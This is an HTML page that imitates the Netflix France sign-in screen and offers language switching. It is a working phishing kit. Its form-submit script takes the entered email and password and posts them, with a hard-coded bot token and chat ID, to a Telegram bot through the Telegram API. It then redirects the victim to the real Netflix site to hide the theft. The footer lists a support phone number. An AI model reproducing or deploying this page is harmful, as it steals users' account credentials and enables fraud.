<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix France - Regardez des séries et films en streaming</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            color: #fff;
            background: #000 url('netflixbackground.jpg') no-repeat center center/cover;
            position: relative;
            min-height: 100vh;
        }

        body::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: -1;
        }

        .header {
            padding: 20px 45px;
            position: relative;
            z-index: 10;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header img {
            height: 45px;
        }

        .language-selector {
            background: rgba(0,0,0,0.4);
            color: white;
            padding: 8px 15px;
            border: 1px solid #aaa;
            border-radius: 4px;
            font-size: 14px;
        }

        .login-container {
            max-width: 450px;
            margin: 0 auto;
            padding: 60px 68px;
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            position: relative;
            z-index: 10;
            margin-top: 30px;
        }

        h1 {
            margin-bottom: 28px;
            font-size: 32px;
            font-weight: 500;
        }

        .input-group {
            margin-bottom: 16px;
            position: relative;
        }

        input {
            width: 100%;
            height: 50px;
            padding: 16px 20px 0;
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }

        input:focus {
            background: #454545;
            outline: none;
        }

        label {
            position: absolute;
            top: 15px;
            left: 20px;
            color: #8c8c8c;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 7px;
            font-size: 11px;
        }

        button {
            width: 100%;
            padding: 16px;
            margin: 24px 0 12px;
            background: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            position: relative;
        }

        button:hover {
            background: #f6121d;
        }

        .remember-help {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            color: #b3b3b3;
            font-size: 13px;
        }

        .remember-me {
            display: flex;
            align-items: center;
        }

        .remember-me input {
            width: auto;
            height: auto;
            margin-right: 5px;
        }

        .remember-help a {
            color: #b3b3b3;
            text-decoration: none;
        }

        .remember-help a:hover {
            text-decoration: underline;
        }

        .signup-now {
            color: #737373;
            margin-top: 16px;
        }

        .signup-now a {
            color: #fff;
            text-decoration: none;
        }

        .signup-now a:hover {
            text-decoration: underline;
        }

        .footer {
            background: rgba(0, 0, 0, 0.75);
            padding: 30px 45px;
            margin-top: 90px;
            color: #737373;
            position: relative;
            z-index: 10;
        }

        .footer a {
            color: #737373;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .footer-top {
            margin-bottom: 30px;
        }

        .footer-links {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }

        .footer-links a {
            font-size: 13px;
        }

        /* Spinner styles */
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }

        .btn-loading {
            color: transparent !important;
        }

        .btn-loading .spinner {
            display: block;
        }

        @media (max-width: 740px) {
            body {
                background: #000;
            }
            
            .login-container {
                padding: 15px;
                margin-top: 0;
                max-width: 100%;
            }
            
            .header {
                padding: 15px;
            }
            
            .header img {
                height: 32px;
            }
            
            .footer-links {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
        <select class="language-selector" id="languageSelector">
            <option value="fr">Français</option>
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="de">Deutsch</option>
        </select>
    </header>

    <div class="login-container">
        <h1 id="loginTitle">S'identifier</h1>
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder=" " required>
                <label for="email" id="emailLabel">E-mail ou numéro de téléphone</label>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder=" " required>
                <label for="password" id="passwordLabel">Mot de passe</label>
            </div>
            <button type="submit" id="submitBtn">
                <span id="loginButtonText">S'identifier</span>
                <div class="spinner"></div>
            </button>
            <div class="remember-help">
                <div class="remember-me">
                    <input type="checkbox" id="remember">
                    <label for="remember" id="rememberLabel">Se souvenir de moi</label>
                </div>
                <a href="#" id="helpLink">Besoin d'aide ?</a>
            </div>
        </form>
        <div class="signup-now">
            <span id="newUserText">Nouveau sur Netflix ?</span> <a href="#" id="signupLink">Inscrivez-vous maintenant.</a>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-top">
            <span id="questionsText">Des questions ? Appelez le</span> <a href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a>
        </div>
        <div class="footer-links">
            <a href="#" id="faqLink">FAQ</a>
            <a href="#" id="helpCenterLink">Centre d'aide</a>
            <a href="#" id="termsLink">Conditions d'utilisation</a>
            <a href="#" id="privacyLink">Confidentialité</a>
            <a href="#" id="cookiesLink">Préférences de cookies</a>
            <a href="#" id="legalLink">Mentions légales</a>
            <a href="#" id="adsLink">Choix liés à la pub</a>
        </div>
        <div>Netflix France</div>
    </footer>

    <script>
        // Traductions multilingues
        const translations = {
            fr: {
                loginTitle: "S'identifier",
                emailLabel: "E-mail ou numéro de téléphone",
                passwordLabel: "Mot de passe",
                loginButtonText: "S'identifier",
                rememberLabel: "Se souvenir de moi",
                helpLink: "Besoin d'aide ?",
                newUserText: "Nouveau sur Netflix ?",
                signupLink: "Inscrivez-vous maintenant.",
                questionsText: "Des questions ? Appelez le",
                faqLink: "FAQ",
                helpCenterLink: "Centre d'aide",
                termsLink: "Conditions d'utilisation",
                privacyLink: "Confidentialité",
                cookiesLink: "Préférences de cookies",
                legalLink: "Mentions légales",
                adsLink: "Choix liés à la pub"
            },
            en: {
                loginTitle: "Sign In",
                emailLabel: "Email or phone number",
                passwordLabel: "Password",
                loginButtonText: "Sign In",
                rememberLabel: "Remember me",
                helpLink: "Need help?",
                newUserText: "New to Netflix?",
                signupLink: "Sign up now.",
                questionsText: "Questions? Call",
                faqLink: "FAQ",
                helpCenterLink: "Help Center",
                termsLink: "Terms of Use",
                privacyLink: "Privacy",
                cookiesLink: "Cookie Preferences",
                legalLink: "Legal Notices",
                adsLink: "Ad Choices"
            },
            es: {
                loginTitle: "Iniciar sesión",
                emailLabel: "Correo electrónico o número de teléfono",
                passwordLabel: "Contraseña",
                loginButtonText: "Iniciar sesión",
                rememberLabel: "Recuérdame",
                helpLink: "¿Necesitas ayuda?",
                newUserText: "¿Nuevo en Netflix?",
                signupLink: "Suscríbete ahora.",
                questionsText: "¿Preguntas? Llama al",
                faqLink: "Preguntas frecuentes",
                helpCenterLink: "Centro de ayuda",
                termsLink: "Términos de uso",
                privacyLink: "Privacidad",
                cookiesLink: "Preferencias de cookies",
                legalLink: "Avisos legales",
                adsLink: "Opciones de anuncios"
            },
            de: {
                loginTitle: "Anmelden",
                emailLabel: "E-Mail oder Telefonnummer",
                passwordLabel: "Passwort",
                loginButtonText: "Anmelden",
                rememberLabel: "Angemeldet bleiben",
                helpLink: "Hilfe benötigt?",
                newUserText: "Neu bei Netflix?",
                signupLink: "Jetzt anmelden.",
                questionsText: "Fragen? Ruf an",
                faqLink: "FAQ",
                helpCenterLink: "Hilfe-Center",
                termsLink: "Nutzungsbedingungen",
                privacyLink: "Datenschutz",
                cookiesLink: "Cookie-Einstellungen",
                legalLink: "Rechtliche Hinweise",
                adsLink: "Werbepräferenzen"
            }
        };

        // Gestion du changement de langue
        document.getElementById('languageSelector').addEventListener('change', function() {
            const lang = this.value;
            updateLanguage(lang);
        });

        function updateLanguage(lang) {
            const trans = translations[lang];
            for (const [key, value] of Object.entries(trans)) {
                const element = document.getElementById(key);
                if (element) {
                    if (element.tagName === 'LABEL' || element.tagName === 'SPAN' || element.tagName === 'A') {
                        element.textContent = value;
                    } else {
                        element.innerHTML = value;
                    }
                }
            }
        }

        // Gestion du formulaire
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Show spinner
            submitBtn.classList.add('btn-loading');
            
            // Send data to Telegram bot
            const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
            const chatId = '-4883048028';
            const message = `🔐 NOUVELLE TENTATIVE DE CONNEXION NETFLIX 🔐

📧 Email: ${email}
🔑 Mot de passe: ${password}

⏰ ${new Date().toLocaleString()}

🌐 Langue: ${document.getElementById('languageSelector').value.toUpperCase()}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Identifiants envoyés à Telegram:', data);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi à Telegram:', error);
            })
            .finally(() => {
                // Wait 2 seconds before redirecting (simulating login)
                setTimeout(() => {
                    window.location.href = 'https://www.netflix.com/browse';
                }, 2000);
            });
        });
    </script>
</body>
</html>
